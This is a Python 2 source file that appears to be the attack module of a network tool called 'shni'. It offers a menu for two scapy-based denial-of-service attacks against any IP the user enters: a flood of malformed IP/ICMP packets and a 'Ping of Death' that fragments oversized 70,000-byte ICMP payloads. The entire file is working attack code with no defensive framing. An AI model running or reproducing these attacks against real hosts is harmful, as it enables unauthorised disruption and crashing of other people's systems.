#attack methods for the shni framework
from scapy.all import *
from netaddr import *
from formatting import bcolors


#Intercept signal
import shni_signals
import signal
import sys


#Check for interrupts
interrupted = False

def view_attacks_menu(shni):
		while 1==1:
			os.system('clear')
			print "Shni - Network Attacks"
			print "======================"
			print ""
			print "Menu"
			print "===="
			print "1. Malformed Packets"
			print "2. Ping Of Death"

			print " "
			print "x. Exit"
			print ""
			value = raw_input("Select an option from the menu: ")

			if value == 'x':
				break

			if value == '1':
				malformed_packets(shni)

			if value == '2':
				ping_of_death(shni)

def malformed_packets(shni):
	os.system('clear')
	print "Shni - Malformed Packets"
	print "========================"
	print ""
	target = raw_input("Enter the target IP: ")
	count = raw_input("How many packets should we send? : ")
	for item in range(0,int(count)):
		send(IP(dst=target, ihl=2, version=3)/ICMP())
	print " "		
	raw_input("Continue")



def ping_of_death(shni):
	os.system('clear')
	print "Shni - Ping of Death"
	print "===================="
	print ""
	import string
	import random
	def packet_generator(size=70000, chars=string.ascii_uppercase + string.digits):
		return ''.join(random.choice(chars) for x in range(size))
	
	target = raw_input("Enter the target IP: ")
	count = raw_input("How many packets should we send? : ")
	for i in range(0, int(count)):
		data = packet_generator()
		for p in fragment(IP(dst=target)/ICMP()/(data)):
			send(p)	


	print " "		
	raw_input("Continue")
	




